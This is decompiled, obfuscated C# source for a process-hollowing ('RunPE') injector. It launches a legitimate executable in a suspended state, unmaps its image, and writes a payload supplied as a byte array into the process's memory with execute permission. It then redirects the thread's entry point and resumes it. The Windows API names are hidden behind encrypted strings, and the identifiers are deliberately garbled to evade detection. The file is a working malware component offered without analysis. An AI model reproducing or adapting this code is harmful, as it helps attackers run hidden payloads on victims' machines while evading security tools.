using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Token: 0x02000012 RID: 18
public class Óµ
{
	// Token: 0x0600005D RID: 93 RVA: 0x000041C8 File Offset: 0x000031C8
	public Óµ()
	{
		this.Dynamic = new Dynamic();
	}

	// Token: 0x0600005E RID: 94 RVA: 0x000041DC File Offset: 0x000031DC
	public static bool ØØØØ(string path, string cmd, byte[] data, bool compatible)
	{
		int num = 1;
		checked
		{
			while (!Óµ.ÑÑÑÑÑÑ(path, cmd, data, compatible))
			{
				num++;
				if (num > 5)
				{
					return false;
				}
			}
			return true;
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00004208 File Offset: 0x00003208
	private static bool ÑÑÑÑÑÑ(string path, string cmd, byte[] data, bool compatible)
	{
		string text = string.Format("\"{0}\"", path);
		Óµ.ÖÖÖÖÖÖ öööööö = default(Óµ.ÖÖÖÖÖÖ);
		Óµ.ÄÄÄÄÄÄ ääääää = default(Óµ.ÄÄÄÄÄÄ);
		checked
		{
			öööööö.Size = (uint)Marshal.SizeOf(typeof(Óµ.ÖÖÖÖÖÖ));
			try
			{
				if (!string.IsNullOrEmpty(cmd))
				{
					text = text + " " + cmd;
				}
				if (!Óµ.ñÛÖ(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref öööööö, ref ääääää))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(data, 60);
				int num2 = BitConverter.ToInt32(data, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!Óµ.Žÿûƒ(ääääää.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!Óµ.ÜÓû(ääääää.ThreadHandle, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int num4;
				int num5;
				if (!Óµ.ÚÖÕæä(ääääää.ProcessHandle, num3 + 8, ref num4, 4, ref num5))
				{
					throw new Exception();
				}
				if (num2 == num4 && Óµ.Ñäæéêë(ääääää.ProcessHandle, num4) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(data, num + 80);
				int bufferSize = BitConverter.ToInt32(data, num + 84);
				int num6 = Óµ.ÓÖÒÕÑ(ääääää.ProcessHandle, num2, length, 12288, 64);
				bool flag;
				if (!compatible && num6 == 0)
				{
					flag = true;
					num6 = Óµ.ÓÖÒÕÑ(ääääää.ProcessHandle, 0, length, 12288, 64);
				}
				if (num6 == 0)
				{
					throw new Exception();
				}
				if (!Óµ.ÊÈÚÙØ(ääääää.ProcessHandle, num6, data, bufferSize, ref num5))
				{
					throw new Exception();
				}
				int num7 = num + 248;
				short num8 = BitConverter.ToInt16(data, num + 6);
				int num9 = 0;
				int num10 = (int)(num8 - 1);
				for (int i = num9; i <= num10; i++)
				{
					int num11 = BitConverter.ToInt32(data, num7 + 12);
					int num12 = BitConverter.ToInt32(data, num7 + 16);
					int srcOffset = BitConverter.ToInt32(data, num7 + 20);
					if (num12 != 0)
					{
						byte[] array2 = new byte[num12 - 1 + 1];
						Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
						if (!Óµ.ÊÈÚÙØ(ääääää.ProcessHandle, num6 + num11, array2, array2.Length, ref num5))
						{
							throw new Exception();
						}
					}
					num7 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(num6);
				if (!Óµ.ÊÈÚÙØ(ääääää.ProcessHandle, num3 + 8, bytes, 4, ref num5))
				{
					throw new Exception();
				}
				int num13 = BitConverter.ToInt32(data, num + 40);
				if (flag)
				{
					num6 = num2;
				}
				array[44] = num6 + num13;
				if (IntPtr.Size == 4)
				{
					if (!Óµ.ÒÒÒÒÒ(ääääää.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!Óµ.þþþþþþ(ääääää.ThreadHandle, array))
				{
					throw new Exception();
				}
				if (Óµ.ÑÐÑÐÑ(ääääää.ThreadHandle) == -1)
				{
					throw new Exception();
				}
			}
			catch (Exception ex)
			{
				Process processById = Process.GetProcessById((int)ääääää.ProcessId);
				if (processById != null)
				{
					processById.Kill();
				}
				return false;
			}
			return true;
		}
	}

	// Token: 0x04000025 RID: 37
	private Dynamic Dynamic;

	// Token: 0x04000026 RID: 38
	private static readonly Óµ.Äñê ñÛÖ = Dynamic.CreateApi<Óµ.Äñê>("kernel32", Encryption.DecryptText("ĈőŘĝŏŒįķŎŖġŎŠĠz", "KeyBase"));

	// Token: 0x04000027 RID: 39
	private static readonly Óµ.ÑÖÎ ÜÓû = Dynamic.CreateApi<Óµ.ÑÖÎ>("kernel32", Encryption.DecryptText("ŝƕƸšƔưƕŷƔƇżƚƲƕƎƤË", "KeyBase"));

	// Token: 0x04000028 RID: 40
	private static readonly Óµ.ÛàÝ Žÿûƒ = Dynamic.CreateApi<Óµ.ÛàÝ>("kernel32", Encryption.DecryptText("ķůƒĻŮƊůőŮšŖŴƌůŨž¥", "KeyBase"));

	// Token: 0x04000029 RID: 41
	private static readonly Óµ.ÖÖÖÖ ÒÒÒÒÒ = Dynamic.CreateApi<Óµ.ÖÖÖÖ>("kernel32", Encryption.DecryptText("ńŰƓļůƋŰŒůŢŗŵƍŰũſ¦", "KeyBase"));

	// Token: 0x0400002A RID: 42
	private static readonly Óµ.Wow64ÖÖÖÖ þþþþþþ = Dynamic.CreateApi<Óµ.Wow64ÖÖÖÖ>("kernel32", Encryption.DecryptText("ŨƚƶľśƌƐƅſƧźƌƚƏŔƚƭżƌƱƟÆ", "KeyBase"));

	// Token: 0x0400002B RID: 43
	private static readonly Óµ.ÊÅÃ ÚÖÕæä = Dynamic.CreateApi<Óµ.ÊÅÃ>("kernel32", Encryption.DecryptText("ĴšűĽňżūŅšƃŌŅůũőŮƉ\u0097", "KeyBase"));

	// Token: 0x0400002C RID: 44
	private static readonly Óµ.Ðîò ÊÈÚÙØ = Dynamic.CreateApi<Óµ.Ðîò>("kernel32", Encryption.DecryptText("ŇżƇśūŨżşŭƃŚŹťůŝŹƐŠ¥", "KeyBase"));

	// Token: 0x0400002D RID: 45
	private static readonly Óµ.Ôñç Ñäæéêë = Dynamic.CreateApi<Óµ.Ôñç>("ntdll", Encryption.DecryptText("ıűŦňŦŬŭĹŦŶőňűŐňŠƅŃŨŹ\u0098", "KeyBase"));

	// Token: 0x0400002E RID: 46
	private static readonly Óµ.ËÙąúö ÓÖÒÕÑ = Dynamic.CreateApi<Óµ.ËÙąúö>("kernel32", Encryption.DecryptText("ńűƎřŹŷŴįŴƈŔŧśƀ£", "KeyBase"));

	// Token: 0x0400002F RID: 47
	private static readonly Óµ.Ñðìĉŏ ÑÐÑÐÑ = Dynamic.CreateApi<Óµ.Ñðìĉŏ>("kernel32", Encryption.DecryptText("ŵƢǄƏƦưƑƋƯƶŻƝØ", "KeyBase"));

	// Token: 0x02000017 RID: 23
	// (Invoke) Token: 0x06000087 RID: 135
	public delegate bool Äñê(string àÿš, string çšÿ, IntPtr öƒýœ, IntPtr ûýùù, bool ñþ, uint Ωó, IntPtr environment, string currentDirectory, ref Óµ.ÖÖÖÖÖÖ startupInfo, ref Óµ.ÄÄÄÄÄÄ processInformation);

	// Token: 0x02000018 RID: 24
	// (Invoke) Token: 0x0600008B RID: 139
	public delegate bool ÑÖÎ(IntPtr thread, int[] context);

	// Token: 0x02000019 RID: 25
	// (Invoke) Token: 0x0600008F RID: 143
	public delegate bool ÛàÝ(IntPtr thread, int[] context);

	// Token: 0x0200001A RID: 26
	// (Invoke) Token: 0x06000093 RID: 147
	public delegate bool ÖÖÖÖ(IntPtr thread, int[] context);

	// Token: 0x0200001B RID: 27
	// (Invoke) Token: 0x06000097 RID: 151
	public delegate bool Wow64ÖÖÖÖ(IntPtr thread, int[] context);

	// Token: 0x0200001C RID: 28
	// (Invoke) Token: 0x0600009B RID: 155
	public delegate bool ÊÅÃ(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	// Token: 0x0200001D RID: 29
	// (Invoke) Token: 0x0600009F RID: 159
	public delegate bool Ðîò(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	// Token: 0x0200001E RID: 30
	// (Invoke) Token: 0x060000A3 RID: 163
	public delegate int Ôñç(IntPtr process, int baseAddress);

	// Token: 0x0200001F RID: 31
	// (Invoke) Token: 0x060000A7 RID: 167
	public delegate int ËÙąúö(IntPtr handle, int address, int length, int type, int protect);

	// Token: 0x02000020 RID: 32
	// (Invoke) Token: 0x060000AB RID: 171
	public delegate int Ñðìĉŏ(IntPtr handle);

	// Token: 0x02000021 RID: 33
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct ÄÄÄÄÄÄ
	{
		// Token: 0x0400003D RID: 61
		public IntPtr ProcessHandle;

		// Token: 0x0400003E RID: 62
		public IntPtr ThreadHandle;

		// Token: 0x0400003F RID: 63
		public uint ProcessId;

		// Token: 0x04000040 RID: 64
		public uint ThreadId;
	}

	// Token: 0x02000022 RID: 34
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct ÖÖÖÖÖÖ
	{
		// Token: 0x04000041 RID: 65
		public uint Size;

		// Token: 0x04000042 RID: 66
		public string Reserved1;

		// Token: 0x04000043 RID: 67
		public string Desktop;

		// Token: 0x04000044 RID: 68
		public string Title;

		// Token: 0x04000045 RID: 69
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		public byte[] Misc;

		// Token: 0x04000046 RID: 70
		public IntPtr Reserved2;

		// Token: 0x04000047 RID: 71
		public IntPtr StdInput;

		// Token: 0x04000048 RID: 72
		public IntPtr StdOutput;

		// Token: 0x04000049 RID: 73
		public IntPtr StdError;
	}
}
